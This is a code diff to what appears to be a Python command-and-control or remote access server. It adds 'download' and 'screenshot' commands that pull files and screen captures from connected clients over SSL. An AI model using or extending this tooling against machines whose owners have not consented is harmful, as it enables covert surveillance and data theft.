@@ -2,6 +2,7 @@ import queue
 import socket
 import ssl
 import threading
+import random
 
 import lib
 from command_controller import Client
@@ -21,6 +22,7 @@ connection_allowed = True
 # Charger les fichiers de certificats SSL
 context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
 context.load_cert_chain(certfile='cert.pem', keyfile='key.pem')
+
 
 def handle_client(conn, addr, command_queue):
     global connection_allowed
@@ -58,6 +60,16 @@ def handle_client(conn, addr, command_queue):
                         if command.startswith("upload"):
                             file_path = command.split(" ")[1]
                             lib.upload_file(file_path, conn)
+
+                        if command.startswith("download"):
+                            file_path = command.split(" ")[1]
+                            lib.download_file(file_path, conn)
+
+                        if command == "screenshot":
+                            # random str (8char) to avoid conflict
+                            random_str = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))
+                            screenshot_path = f"screenshot_{random_str}.png"
+                            lib.download_file(screenshot_path, conn)
 
                         # If the command is "close", close the connection
                         if command == "close":
